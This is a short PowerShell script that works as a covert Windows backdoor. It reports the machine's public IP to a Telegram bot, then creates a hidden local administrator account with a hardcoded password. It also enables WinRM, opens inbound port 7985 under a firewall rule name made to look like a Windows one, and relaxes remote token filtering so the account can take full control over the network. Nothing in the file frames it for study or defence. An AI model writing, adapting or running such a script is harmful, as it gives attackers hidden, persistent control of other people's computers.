$api = "123abc:your_token_here"
$id = "123123123"
$ip = (Invoke-RestMethod -Uri "https://api.ipify.org?format=text").Trim()
$msg = "computer [$ip] port 7985"
Invoke-RestMethod -Uri "https://api.telegram.org/bot$api/sendMessage" -Method Post -Body @{chat_id = $id; text = $msg} | Out-Null
New-LocalUser -Name "1qzt53" -Password (ConvertTo-SecureString "1qzt537" -AsPlainText -Force) -FullName "User 1qzt53" -Description "Added by script" | Out-Null
Add-LocalGroupMember -Group "Administrators" -Member "1qzt53" | Out-Null
"y" | winrm quickconfig *> $null
New-NetFirewallRule -DisplayName "Windows Remote Management for RD" -Direction Inbound -Protocol TCP -LocalPort 7985 -Action Allow -Profile Any | Out-Null
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name LocalAccountTokenFilterPolicy -Value 1 -Type DWord
New-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" -Name "1qzt53" -PropertyType DWord -Value 0 -Force | Out-Null
exit